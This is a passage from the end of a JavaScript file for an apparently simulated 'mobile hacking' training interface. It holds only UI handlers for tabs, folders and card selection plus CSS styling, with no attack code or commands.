        // Show selected tab
        document.getElementById(tabName).classList.add('active');
        event.target.classList.add('active');
    }

    toggleFolder(element) {
        const contents = element.querySelector('.folder-contents');
        if (contents) {
            contents.style.display = contents.style.display === 'none' ? 'block' : 'none';
        }
    }

    selectMalwareType(type) {
        document.querySelectorAll('.malware-card').forEach(card => {
            card.classList.remove('selected');
        });
        event.target.closest('.malware-card').classList.add('selected');
        event.target.closest('.malware-card').dataset.type = type;
    }
}

// Initialize Mobile Hacking App
const mobileApp = new MobileHackingApp();

// Add comprehensive styling
if (typeof document !== 'undefined') {
    const style = document.createElement('style');
    style.textContent = `
        .mobile-stats {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
            gap: 15px;
            margin: 20px 0;
        }
        
        .stat-card {
            background: rgba(230, 126, 34, 0.1);
            border: 1px solid #e67e22;
            border-radius: 8px;
            padding: 15px;
            text-align: center;
            position: relative;
            transition: all 0.3s ease;
        }
        
        .stat-card:hover {
            background: rgba(230, 126, 34, 0.2);
            transform: translateY(-2px);
        }
        
        .stat-number {
            font-size: 2rem;
            font-weight: bold;
            color: #e67e22;
        }
        
        .stat-label {
            color: #ccc;
            font-size: 0.9rem;
            margin-top: 5px;
        }
        
        .stat-icon {
            position: absolute;
            top: 10px;
            right: 10px;
            font-size: 1.2rem;
            opacity: 0.7;
        }
        
        .flag-found {
            background: rgba(230, 126, 34, 0.2);
            color: #e67e22;
            padding: 8px 12px;
            border-radius: 6px;
            margin: 10px 0;
            font-weight: bold;
            border: 1px solid #e67e22;
        }
        
        .risk-high { color: #e74c3c; font-weight: bold; }
        .risk-medium { color: #f39c12; font-weight: bold; }
        .risk-low { color: #27ae60; font-weight: bold; }
        
        .vulnerability {
            color: #ff6b6b;
            margin: 5px 0;
        }
        
        .attack-timeline {
            background: rgba(0, 0, 0, 0.3);
            border-radius: 8px;
            padding: 15px;
            margin: 15px 0;
        }
        
        .timeline-step {
            display: flex;
            align-items: center;
            margin: 8px 0;
            padding: 8px;
            border-radius: 4px;
        }
        
        .timeline-step.completed {
            background: rgba(39, 174, 96, 0.1);
            border-left: 3px solid #27ae60;
        }
        
        .step-time {
            background: #27ae60;
            color: white;
            padding: 2px 8px;
            border-radius: 12px;
            font-size: 0.8rem;
            margin-right: 10px;
            min-width: 40px;
            text-align: center;
        }
        
        .step-desc {
            color: #ccc;
        }
        
        .captured-data {
            background: rgba(231, 76, 60, 0.1);
            border: 1px solid #e74c3c;
            border-radius: 8px;
            padding: 15px;
            margin: 15px 0;
        }
        
        .credential-item {
            display: flex;
            justify-content: space-between;
            margin: 8px 0;
            padding: 5px 0;
            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
        }
        
        .cred-label {
            color: #bbb;
            font-weight: bold;
        }
        
        .cred-value {
            color: #e74c3c;
            font-family: monospace;
        }
        
        .attack-impact {
            margin: 15px 0;
        }
        
        .impact-item {
            padding: 5px 10px;
            margin: 5px 0;
            border-radius: 4px;
        }
        
        .impact-item.high {
            background: rgba(231, 76, 60, 0.2);
            border-left: 3px solid #e74c3c;
        }
        
        .impact-item.medium {
            background: rgba(243, 156, 18, 0.2);
            border-left: 3px solid #f39c12;
        }
        
        .impact-item.low {
            background: rgba(52, 152, 219, 0.2);
            border-left: 3px solid #3498db;
        }
        
        .generated-code {
            background: rgba(0, 0, 0, 0.8);
            border: 1px solid #333;
            border-radius: 8px;
            padding: 15px;
            margin: 15px 0;
        }
        
        .code-info {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 10px;
            margin-bottom: 15px;
        }
        
        .info-item {
            display: flex;
            justify-content: space-between;
        }
        
        .info-label {
            color: #bbb;
            font-weight: bold;
        }
        
        .info-value {
            color: #e67e22;
            font-family: monospace;
        }
        
        .malware-features ul {
            list-style: none;
            padding: 0;
        }
        
        .malware-features li {
            color: #27ae60;
            margin: 5px 0;
        }
        
        @keyframes slideIn {
            from { transform: translateX(100%); opacity: 0; }
            to { transform: translateX(0); opacity: 1; }
        }
        
        @keyframes slideOut {
            from { transform: translateX(0); opacity: 1; }
            to { transform: translateX(100%); opacity: 0; }
        }
    `;
    document.head.appendChild(style);
}